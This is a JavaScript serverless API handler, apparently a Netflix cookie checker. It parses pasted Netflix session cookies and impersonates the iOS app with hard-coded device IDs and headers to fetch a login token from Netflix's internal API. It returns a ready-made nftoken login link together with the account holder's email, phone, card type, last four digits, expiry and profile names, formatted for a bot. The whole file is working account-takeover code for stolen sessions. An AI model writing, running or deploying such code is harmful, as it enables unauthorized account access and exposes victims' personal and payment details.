// api/generate.js

const COUNTRY_MAP = {
  "CO": "🇨🇴 Colombia (CO)", "FR": "🇫🇷 France (FR)", "US": "🇺🇸 United States (US)",
  "IN": "🇮🇳 India (IN)", "ES": "🇪🇸 Spain (ES)", "DE": "🇩🇪 Germany (DE)",
  // baki countries ki zarurat ho to pehle wala poora map yahan daal do
};

function getCountryDisplay(code) {
  return COUNTRY_MAP[code] || code;
}

function extractCookies(text) {
  const keys = ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'];
  const cookies = {};

  // 1. JSON format
  try {
    const json = JSON.parse(text);
    if (Array.isArray(json) && json.length && json[0]?.name) {
      json.forEach(c => { if (keys.includes(c.name)) cookies[c.name] = c.value; });
    } else if (json && typeof json === 'object') {
      keys.forEach(k => { if (json[k] !== undefined) cookies[k] = json[k]; });
    }
  } catch (e) {}

  // 2. Netscape cookies.txt format
  if (text.includes('\t')) {
    const lines = text.split(/\r\n|\r|\n/);
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed[0] === '#') continue;
      const parts = trimmed.split('\t');
      if (parts.length >= 7) {
        const name = parts[5].trim();
        let value = parts[6].trim();
        try { value = decodeURIComponent(value); } catch (_) {}
        if (keys.includes(name)) cookies[name] = value;
      }
    }
  }

  // 3. Universal key=value fallback
  const segments = text.split(/[;\n\r]+/);
  for (let segment of segments) {
    segment = segment.trim();
    if (!segment) continue;
    if (segment.toLowerCase().startsWith('cookie:')) {
      segment = segment.substring(7).trim();
    }
    const eqPos = segment.indexOf('=');
    if (eqPos === -1) continue;
    let key = segment.substring(0, eqPos).trim();
    let value = segment.substring(eqPos + 1).trim().replace(/;+$/, '');
    try {
      key = decodeURIComponent(key);
      value = decodeURIComponent(value);
    } catch (_) {}
    if (keys.includes(key)) cookies[key] = value;
  }

  return cookies;
}

function parsePayment(account) {
  const payMethod = account.billing?.paymentMethod || account.paymentMethod || '';
  if (typeof payMethod === 'string') {
    const cardMatch = payMethod.match(/(\w+)\s+••••\s+(\d+)\s*(?:\(Exp:\s*(\d{2}\/\d{2})\))?/);
    if (cardMatch) {
      return {
        type: cardMatch[1],
        lastFourDigits: cardMatch[2],
        expiry: cardMatch[3] || 'N/A'
      };
    }
  }
  const creditCard = account.billing?.creditCard;
  if (creditCard) {
    return {
      type: creditCard.type || creditCard.cardType || payMethod,
      lastFourDigits: creditCard.lastFourDigits || creditCard.cardNumber?.slice(-4) || 'N/A',
      expiry: (creditCard.expirationMonth && creditCard.expirationYear) 
        ? `${creditCard.expirationMonth}/${creditCard.expirationYear}` 
        : 'N/A'
    };
  }
  return { type: payMethod || 'N/A', lastFourDigits: 'N/A', expiry: 'N/A' };
}

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }

  try {
    const { cookie: raw_cookie, device = 'mobile' } = req.body || {};
    if (!raw_cookie || typeof raw_cookie !== 'string' || !raw_cookie.trim()) {
      return res.status(400).json({ error: 'No cookie data provided.' });
    }

    const cookie_dict = extractCookies(raw_cookie.trim());
    if (!cookie_dict.NetflixId) {
      return res.status(400).json({ error: 'Missing required cookie: NetflixId.' });
    }

    const API_URL = 'https://ios.prod.ftl.netflix.com/iosui/user/15.48';
    const queryParams = new URLSearchParams({
      appVersion: '15.48.1',
      config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
      device_type: 'NFAPPL-02-',
      esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
      idiom: 'phone',
      iosVersion: '15.8.5',
      isTablet: 'false',
      languages: 'en-US',
      locale: 'en-US',
      maxDeviceWidth: '375',
      model: 'saget',
      modelType: 'IPHONE8-1',
      odpAware: 'true',
      path: '["user","account","token","default"]',
      pathFormat: 'graph',
      pixelDensity: '2.0',
      progressive: 'false',
      responseFormat: 'json'
    });

    // Mobile headers (tumhare diye hue)
    const headers = {
      'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
      'x-netflix.request.attempt': '1',
      'x-netflix.request.client.user.guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
      'x-netflix.context.profile-guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
      'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
      'x-netflix.context.app-version': '15.48.1',
      'x-netflix.argo.translated': 'true',
      'x-netflix.context.form-factor': 'phone',
      'x-netflix.context.sdk-version': '2012.4',
      'x-netflix.client.appversion': '15.48.1',
      'x-netflix.context.max-device-width': '375',
      'x-netflix.context.ab-tests': '',
      'x-netflix.tracing.cl.useractionid': '4DC655F2-9C3C-4343-8229-CA1B003C3053',
      'x-netflix.client.type': 'argo',
      'x-netflix.client.ftl.esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
      'x-netflix.context.locales': 'en-US',
      'x-netflix.context.top-level-uuid': '90AFE39F-ADF1-4D8A-B33E-528730990FE3',
      'x-netflix.client.iosversion': '15.8.5',
      'accept-language': 'en-US;q=1',
      'x-netflix.argo.abtests': '',
      'x-netflix.context.os-version': '15.8.5',
      'x-netflix.request.client.context': '{"appState":"foreground"}',
      'x-netflix.context.ui-flavor': 'argo',
      'x-netflix.argo.nfnsm': '9',
      'x-netflix.context.pixel-density': '2.0',
      'x-netflix.request.toplevel.uuid': '90AFE39F-ADF1-4D8A-B33E-528730990FE3',
      'x-netflix.request.client.timezoneid': 'Asia/Dhaka',
      'Cookie': `NetflixId=${cookie_dict.NetflixId}`
    };

    const apiRes = await fetch(`${API_URL}?${queryParams.toString()}`, {
      method: 'GET',
      headers: headers,
    });

    if ([401, 403, 400].includes(apiRes.status)) {
      return res.json({ error: 'Cookies expired or invalid.' });
    }
    if (!apiRes.ok) {
      return res.status(apiRes.status).json({ error: `Netflix API returned ${apiRes.status}` });
    }

    const data = await apiRes.json();
    const user = data?.value?.user || {};
    const account = data?.value?.account || {};

    const tokenData = account?.token?.default || {};
    const token = tokenData.token;
    if (!token) {
      return res.json({ error: 'Token not found. Cookie expired.' });
    }
    let expires = tokenData.expires;
    if (typeof expires === 'number' && expires.toString().length === 13) {
      expires = Math.floor(expires / 1000);
    }
    const loginUrl = `https://netflix.com/?nftoken=${encodeURIComponent(token)}`;

    // Account details
    const planName = user.membershipPlan?.plan || 'N/A';
    const planPrice = user.membershipPlan?.recurringCharge;
    const planCurrency = user.membershipPlan?.currency;
    const membershipStatus = user.membershipStatus || 'CURRENT_MEMBER';
    const memberSince = account.planInfo?.memberSince || user.membershipStartDate || 'N/A';
    const countryCode = user.countryOfSignup || 'N/A';
    const email = user.email || 'N/A';
    const phone = account.phone || user.phone || 'N/A';
    const payment = parsePayment(account);
    const profilesArray = user.profiles || [];
    const profileNames = profilesArray.map(p => p.profileName || p.name).filter(Boolean).join(', ') || 'N/A';
    const profilesCount = profilesArray.length || 'N/A';

    const accountInfo = {
      email,
      phone,
      country: getCountryDisplay(countryCode),
      membershipStatus: membershipStatus === 'CURRENT_MEMBER' ? 'Active' : 'Inactive',
      memberSince,
      plan: {
        name: planName.charAt(0) + planName.slice(1).toLowerCase(),
        price: planPrice || undefined,
        currency: planCurrency || undefined
      },
      payment
    };

    const response = {
      status: "SUCCESS",
      url: loginUrl,
      expires_ts: Number(expires),
      expires: new Date(Number(expires) * 1000).toISOString().replace('T', ' ').split('.')[0],
      account: accountInfo,
      // legacy fields for your bot
      email: email,
      country: countryCode,
      country_display: getCountryDisplay(countryCode),
      plan: accountInfo.plan.name,
      price: planPrice ? `${planCurrency} ${planPrice}` : 'N/A',
      renewal_date: account.planInfo?.renewalDate || 'N/A',
      member_since: memberSince,
      payment: payment.type + (payment.lastFourDigits !== 'N/A' ? ` •••• ${payment.lastFourDigits}` : '') + (payment.expiry !== 'N/A' ? ` (Exp: ${payment.expiry})` : ''),
      phone: phone,
      profiles_count: profilesCount,
      profile_names: profileNames,
      x_mail: email,
      x_tier: accountInfo.plan.name,
      x_loc: countryCode,
      x_ren: account.planInfo?.renewalDate || 'N/A',
      x_mem: memberSince,
      x_bil: payment.type,
      x_tel: phone,
      x_usr: profileNames,
    };

    return res.json(response);
  } catch (error) {
    console.error('Function error:', error);
    return res.status(500).json({ error: 'Internal server error. Please try again later.' });
  }
}
